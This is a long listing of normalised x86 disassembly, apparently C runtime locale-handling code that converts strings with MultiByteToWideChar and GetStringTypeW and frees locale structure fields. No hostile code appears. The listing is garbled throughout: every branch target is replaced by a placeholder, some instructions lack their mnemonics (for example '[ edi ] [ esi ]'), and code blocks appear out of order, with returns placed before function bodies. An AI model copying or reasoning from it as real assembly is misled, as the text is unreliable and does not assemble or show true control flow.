mov [ esi ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x90 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0x94 ] eax
mov eax [ ebp - 0x34 ]
mov [ esi + 0x98 ] eax
mov eax [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
jmp r-xdata
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
cmp edx eax
jle r-xdata
push [ ebp - 0x30 ]
call sub_42d3b1
pop ecx
mov eax ebx
jmp r-xdata
mov eax [ esi + 0x90 ]
sub eax 0xfe
push eax
call sub_42d3b1
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_42d3b1
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_42d3b1
push [ esi + 0x8c ]
call sub_42d3b1
add esp 0x10
mov eax [ ebp - 0x24 ]
movzx esi [ ecx - 0x1 ]
movzx eax al
cmp esi eax
jg r-xdata
mov [ edx + edi ] 0x20
inc edx
movzx eax [ ecx ]
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
add ecx 0x2
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea edi [ edx + 0x100 ]
lea edi [ edi + esi * 2 ]
mov al [ ecx ]
test al al
je r-xdata
mov al [ ecx ]
test al al
je r-xdata
mov eax 0x8000
inc esi
mov [ edi ] ax
lea edi [ edi + 0x2 ]
movzx eax [ ecx ]
cmp esi eax
jle r-xdata
sub_43965e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
push eax
call sub_42d3b1
pop ecx
sub_43975c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ecx
cmp [ ebx + 0xac ] ecx
jne r-xdata
push 0x50
push 0x1
call sub_42d49d
mov esi eax
push 0x0
mov [ ebp - 0x4 ] esi
call sub_42d3b1
add esp 0xc
test esi esi
jne r-xdata
cmp [ ebx + 0xb0 ] ecx
jne r-xdata
push 0x4
push 0x1
call sub_42d49d
mov edi eax
push 0x0
mov [ ebp - 0x8 ] edi
call sub_42d3b1
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov edi ecx
mov [ ebp - 0x8 ] ecx
mov esi rw-data
jmp r-xdata
cmp [ ebx + 0xac ] 0x0
je r-xdata
push esi
call sub_42d3b1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x84 ]
test eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
mov esi rw-data
push 0x14
pop ecx
[ edi ] [ esi ]
push 0x4
push 0x1
call sub_42d49d
mov edi eax
push 0x0
mov [ ebp - 0xc ] edi
call sub_42d3b1
add esp 0xc
test edi edi
jne r-xdata
mov ecx [ ebx + 0x7c ]
test ecx ecx
je r-xdata
[ eax ]
mov [ edi ] ecx
mov edi [ ebx + 0xac ]
lea eax [ esi + 0xc ]
push eax
push 0x15
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4441ce
mov ecx [ ebp - 0x4 ]
mov esi eax
add ecx 0x10
lea eax [ ebp - 0x18 ]
push ecx
push 0x14
push edi
push 0x1
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x14
push eax
push 0x16
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x18
push eax
push 0x17
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4441ce
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x1c
mov [ ebp - 0x10 ] eax
push eax
push 0x18
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x20
push eax
push 0x50
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x24
push eax
push 0x51
push edi
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
push 0x1a
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_4441ce
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x29
push eax
push 0x19
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2a
push eax
push 0x54
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2b
push eax
push 0x55
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2c
push eax
push 0x56
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_4441ce
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2d
push eax
push 0x57
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2e
push eax
push 0x52
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x2f
push eax
push 0x53
push edi
lea eax [ ebp - 0x18 ]
push 0x0
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x38
push eax
push 0x15
push edi
push 0x2
lea eax [ ebp - 0x18 ]
push eax
call sub_4441ce
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x3c
push eax
push 0x14
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x40
push eax
push 0x16
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x44
push eax
push 0x17
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x48
push eax
push 0x50
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_4441ce
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x4c
push eax
push 0x51
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_4441ce
add esp 0x14
or eax esi
je r-xdata
push esi
call sub_42d3b1
mov eax [ ebp - 0x8 ]
push eax
call sub_42d3b1
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x7c ] eax
xor eax eax
mov [ ebx + 0x84 ] edi
mov [ ebx + 0x88 ] esi
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
mov edx [ ebp - 0x10 ]
mov edx [ edx ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
push ebx
call sub_43965e
push ebx
call sub_42d3b1
mov eax [ ebp - 0x8 ]
push eax
call sub_42d3b1
mov eax [ ebp - 0xc ]
push eax
call sub_42d3b1
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ ebx + 0x88 ]
call sub_42d3b1
push [ ebx + 0x7c ]
call sub_42d3b1
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebx + 0x88 ]
xor ecx ecx
mov esi [ ebp - 0x4 ]
inc ecx
mov edi [ ebp - 0xc ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x30 ] eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x34 ]
mov [ esi + 0x34 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] ecx
test edi edi
je r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_439b18
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
pop ebp
retn
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ edx ]
cmp al 0x30
jl r-xdata
pop esi
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
cmp [ edx ] 0x0
jne r-xdata
sub_439b52
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_42d3b1
pop ecx
push eax
call sub_42d3b1
pop ecx
sub_439bbb
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
push esi
push edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] eax
cmp [ ebx + 0xb0 ] eax
jne r-xdata
xor esi esi
inc esi
push 0x50
push esi
mov [ ebp - 0xc ] esi
call sub_42d49d
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebx + 0xac ] eax
jne r-xdata
mov esi [ ebx + 0x88 ]
mov edi eax
push 0x14
pop ecx
[ edi ] [ esi ]
push 0x4
call sub_42d3eb
mov esi eax
xor edi edi
push edi
mov [ ebp - 0x8 ] esi
call sub_42d3b1
pop ecx
pop ecx
test esi esi
jne r-xdata
mov eax esi
jmp r-xdata
mov edi eax
mov [ ebp - 0x8 ] eax
mov esi rw-data
jmp r-xdata
mov [ esi ] edi
cmp [ ebx + 0xb0 ] edi
je r-xdata
push [ ebp - 0x4 ]
call sub_42d3b1
xor eax eax
pop ecx
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ rw-data ]
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax [ rw-data ]
mov [ esi + 0x30 ] eax
mov eax [ rw-data ]
mov [ esi + 0x34 ] eax
jmp r-xdata
push 0x4
call sub_42d3eb
mov esi eax
push edi
mov [ ebp - 0x10 ] esi
call sub_42d3b1
pop ecx
pop ecx
test esi esi
je r-xdata
mov ecx [ ebx + 0x7c ]
test ecx ecx
je r-xdata
[ eax ]
mov ecx [ ebp - 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
test edi edi
je r-xdata
push [ ebp - 0x4 ]
call sub_42d3b1
mov ecx [ ebp - 0x8 ]
push ecx
call sub_42d3b1
mov eax [ ebp - 0xc ]
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
mov [ esi ] edi
lea eax [ ebp - 0x18 ]
mov edi [ ebx + 0xb0 ]
push 0xe
push edi
push 0x1
push eax
call sub_4441ce
mov ecx [ ebp - 0x4 ]
mov esi eax
add ecx 0x4
lea eax [ ebp - 0x18 ]
push ecx
push 0xf
push edi
push 0x1
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
push 0x10
push edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4441ce
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x30
push eax
push 0xe
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_4441ce
add esp 0x50
or esi eax
mov eax [ ebp - 0x4 ]
add eax 0x34
push eax
push 0xf
push edi
lea eax [ ebp - 0x18 ]
push 0x2
push eax
call sub_4441ce
add esp 0x14
or eax esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x7c ] eax
xor eax eax
mov [ ebx + 0x80 ] edi
mov [ ebx + 0x88 ] esi
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
mov [ edi ] eax
mov edx [ ebp - 0xc ]
mov edx [ edx ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_439b52
or [ ebp - 0xc ] 0xffffffff
pop ecx
push [ ebx + 0x7c ]
call sub_42d3b1
push [ ebx + 0x88 ]
call sub_42d3b1
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
mov edi [ ebp - 0x10 ]
mov esi [ ebp - 0x4 ]
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_439dd7
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
pop ebp
retn
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ edx ]
cmp al 0x30
jl r-xdata
pop esi
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
cmp [ edx ] 0x0
jne r-xdata
sub_439ec5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
lea eax [ esi + eax * 4 ]
mov ecx eax
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp eax esi
sbb ebx ebx
not ebx
and ebx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push [ esi ]
call sub_42d3b1
inc edi
lea esi [ esi + 0x4 ]
pop ecx
cmp edi ebx
jne r-xdata
sub_439f04
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0xb4 ] 0x0
jne r-xdata
push esi
push 0x164
push 0x1
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
mov eax r--data
jmp r-xdata
xor edi edi
push edi
push esi
call sub_439f65
pop ecx
pop ecx
test al al
jne r-xdata
pop edi
pop ebp
retn
mov [ esi + 0xb0 ] 0x1
mov edi esi
xor esi esi
jmp r-xdata
push esi
call sub_43a1fc
pop ecx
push esi
call sub_42d3b1
pop ecx
mov eax edi
pop esi
sub_439f65
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ eax + 0xb4 ]
push edi
push esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x14 ] eax
call sub_42b88b
pop ecx
mov ecx [ ebp + 0x8 ]
xor ebx ebx
push 0x31
mov [ ecx + 0x160 ] eax
pop eax
push 0x7
pop edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
push 0x7
pop edi
add eax 0xffffffd0
xor edx edx
div edi
mov edi edx
lea eax [ ecx + edi * 4 ]
push eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push esi
push 0x1
push eax
call sub_4441ce
mov esi [ ebp - 0x4 ]
or ebx eax
mov eax [ ebp + 0x8 ]
add esi 0xfffffff9
lea eax [ eax + edi * 4 ]
add eax 0x1c
push eax
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4441ce
or ebx eax
mov eax [ ebp + 0x8 ]
lea eax [ eax + edi * 4 ]
add eax 0xb4
push eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x14 ]
push [ ebp - 0x8 ]
push 0x2
push eax
call sub_4441ce
or ebx eax
mov eax [ ebp + 0x8 ]
lea eax [ eax + edi * 4 ]
mov edi [ ebp - 0x8 ]
add eax 0xd0
push eax
push esi
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_4441ce
or ebx eax
add esp 0x50
mov eax [ ebp - 0x4 ]
inc eax
sub [ ebp - 0xc ] 0x1
mov [ ebp - 0x4 ] eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi edi
mov eax [ ebp + 0x8 ]
push 0x38
pop esi
add eax 0x68
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0xc
add eax 0xffffffd0
add esi 0xc
push eax
push esi
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4441ce
push [ ebp - 0x4 ]
or ebx eax
lea eax [ ebp - 0x14 ]
push [ ebp - 0x8 ]
push edi
push 0x1
push eax
call sub_4441ce
or ebx eax
mov eax [ ebp - 0x4 ]
add eax 0x84
push eax
push esi
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_4441ce
mov esi [ ebp - 0x8 ]
or ebx eax
mov eax [ ebp - 0x4 ]
add eax 0xb4
push eax
push esi
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_4441ce
or ebx eax
add esp 0x50
mov eax [ ebp - 0x4 ]
add eax 0x4
inc esi
sub [ ebp - 0xc ] 0x1
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esi
jne r-xdata
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x98 ]
push eax
push 0x28
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4441ce
or ebx eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4441ce
or ebx eax
lea eax [ esi + 0x14c ]
push eax
push 0x28
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_4441ce
or ebx eax
lea eax [ esi + 0x150 ]
push eax
push 0x29
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_4441ce
add esp 0x50
or ebx eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4441ce
or ebx eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4441ce
or ebx eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4441ce
or ebx eax
lea eax [ esi + 0xac ]
push eax
push 0x1009
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_4441ce
add esp 0x50
or ebx eax
lea eax [ esi + 0x154 ]
push eax
push 0x1f
push edi
push 0x2
lea eax [ ebp - 0x14 ]
push eax
call sub_4441ce
or ebx eax
lea eax [ esi + 0x158 ]
push eax
push 0x20
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_4441ce
or ebx eax
lea eax [ esi + 0x15c ]
push eax
push 0x1003
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_4441ce
add esp 0x3c
or eax ebx
neg eax
sbb eax eax
pop edi
pop esi
inc eax
pop ebx
mov esp ebp
pop ebp
retn
sub_43a1fc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push 0x7
push esi
call sub_439ec5
lea eax [ esi + 0x1c ]
push 0x7
push eax
call sub_439ec5
lea eax [ esi + 0x38 ]
push 0xc
push eax
call sub_439ec5
lea eax [ esi + 0x68 ]
push 0xc
push eax
call sub_439ec5
lea eax [ esi + 0x98 ]
push 0x2
push eax
call sub_439ec5
push [ esi + 0xa0 ]
call sub_42d3b1
push [ esi + 0xa4 ]
call sub_42d3b1
push [ esi + 0xa8 ]
call sub_42d3b1
lea eax [ esi + 0xb4 ]
push 0x7
push eax
call sub_439ec5
lea eax [ esi + 0xd0 ]
push 0x7
push eax
call sub_439ec5
add esp 0x44
lea eax [ esi + 0xec ]
push 0xc
push eax
call sub_439ec5
lea eax [ esi + 0x11c ]
push 0xc
push eax
call sub_439ec5
lea eax [ esi + 0x14c ]
push 0x2
push eax
call sub_439ec5
push [ esi + 0x154 ]
call sub_42d3b1
push [ esi + 0x158 ]
call sub_42d3b1
push [ esi + 0x15c ]
call sub_42d3b1
push [ esi + 0x160 ]
call sub_42d3b1
add esp 0x28
sub_43a2e0
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0xb4 ] 0x0
jne r-xdata
push 0x164
push 0x1
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov esi r--data
jmp r-xdata
push edi
push esi
call sub_439f65
pop ecx
pop ecx
test al al
jne r-xdata
push eax
call sub_42d3b1
jmp r-xdata
push [ edi + 0x9c ]
call sub_43a7e0
mov [ edi + 0x9c ] esi
xor eax eax
push 0x0
mov [ esi + 0xb0 ] 0x1
call sub_42d3b1
pop ecx
push esi
call sub_43a1fc
push esi
call sub_42d3b1
pop ecx
xor eax eax
inc eax
jmp r-xdata
pop ecx
pop edi
pop esi
pop ebp
retn
sub_43a35f
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
push ebx
push esi
push edi
mov eax ecx
cmp [ ecx ] dx
je r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0xc ]
movzx ebx [ edi ]
add eax 0x2
cmp [ eax ] dx
jne r-xdata
movzx edx [ eax ]
mov [ ebp - 0x4 ] edx
mov edx ebx
mov esi edi
test bx bx
je r-xdata
add esi 0x2
movzx edx [ esi ]
test dx dx
jne r-xdata
cmp [ ebp - 0x4 ] dx
je r-xdata
xor edx edx
sub_43a3af
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
pop ebp
retn
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop esi
pop ebp
retn
movzx esi [ edx ]
test si si
je r-xdata
cmp si [ ecx ]
jne r-xdata
add edx 0x2
add ecx 0x2
jmp r-xdata
sub eax 0x1
je r-xdata
sub_43a3e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
push esi
push edi
cmp [ eax ] cx
je r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
movzx edi [ esi ]
add eax 0x2
xor ecx ecx
cmp [ eax ] cx
jne r-xdata
movzx ebx [ eax ]
mov edx edi
mov ecx esi
test di di
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add ecx 0x2
movzx edx [ ecx ]
test dx dx
jne r-xdata
cmp dx bx
je r-xdata
sub_43a483
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_41cbf0
mov ecx [ ebp + 0x1c ]
test ecx ecx
jne r-xdata
xor eax eax
xor edi edi
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov ecx eax
mov [ ebp + 0x1c ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x8 ]
cmp ebx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax edi
lea esp [ ebp - 0x24 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
and [ eax + 0x350 ] 0xfffffffd
mov esi edi
lea ecx [ ebx + 0x8 ]
cmp ebx ecx
sbb eax eax
and eax ecx
lea ecx [ ebx + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_43a5a0
pop ecx
push ebx
push edi
push esi
call sub_40dea0
add esp 0xc
push [ ebp - 0x8 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp ebx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d3eb
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp ebx ecx
sbb eax eax
and eax ecx
call sub_448dc0
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_43a5a0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_42d3b1
pop ecx
sub_43a5c0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
[ eax + 0xc ]
mov ecx [ eax + 0x7c ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x84 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x80 ]
test ecx ecx
je r-xdata
[ ecx ]
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
[ ecx ]
push esi
push 0x6
lea ecx [ eax + 0x28 ]
pop esi
[ ecx ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
add ecx 0x10
sub esi 0x1
jne r-xdata
mov edx [ ecx - 0x4 ]
test edx edx
je r-xdata
[ edx ]
cmp [ ecx - 0x8 ] rw-data
je r-xdata
push [ eax + 0x9c ]
call sub_43a787
pop ecx
pop esi
pop ebp
retn
[ edx ]
sub_43a63d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
cmp eax rw-data
je r-xdata
push [ esi + 0x9c ]
call sub_43a7b0
pop ecx
push 0x6
pop eax
lea ebx [ esi + 0xa0 ]
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0x28 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ edi - 0xc ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi + 0x90 ]
sub eax 0xfe
push eax
call sub_42d3b1
mov eax [ esi + 0x94 ]
mov edi 0x80
sub eax edi
push eax
call sub_42d3b1
mov eax [ esi + 0x98 ]
sub eax edi
push eax
call sub_42d3b1
push [ esi + 0x8c ]
call sub_42d3b1
add esp 0x10
cmp [ eax ] 0x0
jne r-xdata
add ebx 0x4
add edi 0x10
sub eax 0x1
mov [ ebp - 0x4 ] eax
